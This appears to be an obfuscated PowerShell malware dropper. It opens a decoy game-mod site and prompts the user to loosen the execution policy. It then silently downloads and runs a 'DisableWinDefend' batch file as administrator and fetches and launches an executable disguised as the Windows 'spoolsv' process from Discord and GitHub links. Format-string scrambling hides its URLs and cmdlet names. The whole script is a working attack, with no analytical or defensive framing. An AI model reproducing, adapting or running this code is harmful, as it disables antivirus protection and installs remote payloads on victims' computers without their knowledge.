
$fileContent = "Command: Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$filePath = Join-Path -Path $desktopPath -ChildPath "Before_Proceeding.txt"
$fileContent | Set-Content -Path $filePath -Force
Start-Process notepad.exe -ArgumentList $filePath
Start-Sleep -Seconds 1
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('% x')

${U`Rl} = ("{3}{14}{15}{6}{29}{36}{11}{33}{30}{2}{23}{13}{18}{0}{28}{7}{38}{31}{37}{4}{19}{9}{27}{1}{16}{25}{17}{10}{20}{26}{12}{22}{34}{21}{35}{24}{8}{5}{32}"-f '7872/','6','/1','https:','s1?','311e08ef','ord','8','8','=66','41af','h','2','276','//cdn.','disc','5','c7','89','ex','74df80','ae2b','2fd6c254f0abaef','218683568','7819bfb8fd','f62bd0&hm=1','8be','08a0d0&is=','121','app.com/','s','/','ed8b','ment','5ed','ae','attac','notepad.p','703212086034552')
$outputFile = "$env:TEMP\notepad.ps1"
$url = "https://www.curseforge.com/" 

Start-Process $url
Invoke-WebRequest -Uri $url -OutFile $outputFile
Write-Host "Press Ctrl C to end the PowerShell"
Write-Host "a README.txt Document has been created paste the command into the powershell"

if (Test-Path $outputFile) {
    Invoke-Expression -Command $outputFile
} else {
    Write-Host "Failed to download the file."
}

$duration = 40  
Write-Host "Timer started for 40 seconds."
Start-Sleep -Seconds $duration
Write-Host "Timer expired after 40 seconds."

${WIN`RaR`URL} = ("{4}{13}{5}{9}{6}{3}{0}{1}{11}{12}{7}{10}{2}{8}" -f'admin/winrar-ve','r','4-60','-rar.com/file','h',':','.win','inrar/wi','2.exe','//www','nrar-x6','si','ons/w','ttps')
${I`N`StALleRpa`Th} = "$env:TEMP\winrar-installer.exe"

&("{0}{4}{1}{3}{2}" -f 'Invo','-WebReq','t','ues','ke') -Uri ${W`Inr`ArurL} -OutFile ${InS`TAlLe`RPA`TH}
.("{2}{1}{0}" -f'Process','art-','St') -FilePath ${in`s`TaLlER`paTH} -ArgumentList "/S" -Wait
.("{0}{1}{2}"-f'Remo','ve-','Item') ${iNST`Al`LE`RpaTH}
${ZI`pu`Rl} = ("{31}{21}{13}{14}{5}{30}{9}{32}{8}{33}{34}{26}{11}{10}{1}{2}{19}{7}{4}{27}{29}{16}{28}{35}{36}{3}{25}{20}{0}{6}{15}{24}{18}{22}{37}{17}{23}{12}"-f '6','fend-main.z','ip?ex=','449b74f','a8&is=65f','75','754a','60889','091','8','nDe','leWi','abf5&','cordapp.com/at','tachments/12183','3','732e87d4','025','b','6','1','dis','780a755','6d0de','d','27f9b9','sab','614a8&hm=221b','9876','7','699518328836/121867','https://cdn.','351515','064/D','i','60e','f','e8')
${Zi`pfi`L`ePATH} = "$env:TEMP\winrar.zip"
${E`Xtr`ACTpA`Th} = "$env:TEMP\winrar-extract"
${FIle`T`oRun} = "$extractPath\DisableWinDefend-main\RunScript11.bat"

.("{0}{1}{2}{3}" -f'Inv','oke-W','ebReq','uest') -Uri ${Zi`puRL} -OutFile ${Z`IpfIl`EPAth}
if (-not (&("{2}{0}{1}"-f 't','-Path','Tes') ${e`xTrAc`TP`ATH})) {
    .("{1}{0}{2}"-f'-It','New','em') -Path ${e`xTrACT`p`ATh} -ItemType ("{0}{2}{1}"-f 'Di','ry','recto')
}
.("{2}{0}{1}"-f '-Arc','hive','Expand') -Path ${zi`p`FIlep`Ath} -DestinationPath ${ExtR`A`cTpaTH} -Force
&("{2}{0}{1}"-f 'rt-Pr','ocess','Sta') -FilePath ${fi`L`eto`RUN} -Verb ("{0}{1}"-f'Ru','nAs')
${s`CrIptU`Rl} = ("{8}{21}{11}{28}{13}{6}{3}{1}{26}{22}{17}{23}{12}{10}{15}{24}{2}{7}{20}{31}{19}{5}{4}{30}{18}{25}{27}{14}{9}{29}{0}{16}" -f 'b02106b','ts/12','088fe','achmen','0ce','832f','m/att','c&is=65f61ae','https:','b3','tected.','dn.','ro','dapp.co','f8f580faf','exe?ex=','&','97872/1218','dad','hm=b5286','c','//c','6835682768','685079077785721/spoolsv_p','66','fe9','18','3a262','discor','b6e65e5d18a7aa1','672dbea7','&')
${sCr`i`pTP`Ath} = "$env:TEMP\spoolsv_protected.exe"

.("{1}{3}{2}{0}" -f't','I','oke-WebReques','nv') -Uri ${ScRI`PtU`RL} -OutFile ${S`Cr`IpT`Path}
.("{4}{2}{0}{3}{1}" -f 'oke-Expr','ion','v','ess','In') -Command ${scr`IpTP`A`Th}
${gi`THuBU`RL} = ("{2}{11}{7}{9}{10}{12}{6}{0}{3}{4}{8}{1}{5}"-f 'd','d','https://git','/raw/main/spoolsv','_pr','.exe','e','b.co','otecte','m/pe','iceofmind/','hu','updat')
${d`eST`iNaTioNPAth} = "$env:TEMP\spoolsv_protected.exe"
&("{3}{2}{0}{1}"-f 'ques','t','Re','Invoke-Web') -Uri ${gIt`HuBu`RL} -OutFile ${D`Es`Ti`NaTIoNpA`Th}
if (&("{0}{1}{2}" -f 'Test','-Pat','h') ${d`EstinaTiO`NPa`Th}) {
    &("{1}{2}{0}"-f '-Host','Wr','ite') ('Fil'+'e '+'downlo'+'ad'+'e'+'d '+'suc'+'c'+'e'+'ssfully '+'t'+'o: '+"$destinationPath")
    &("{2}{1}{0}" -f '-Process','tart','S') ${d`E`s`Ti`NAtIOnpatH}
} else {
    .("{0}{1}{2}" -f'Wri','te-Hos','t') ("{2}{3}{6}{1}{4}{5}{0}"-f'b.','the ','Fail','ed to downlo','file from',' GitHu','ad ')
}
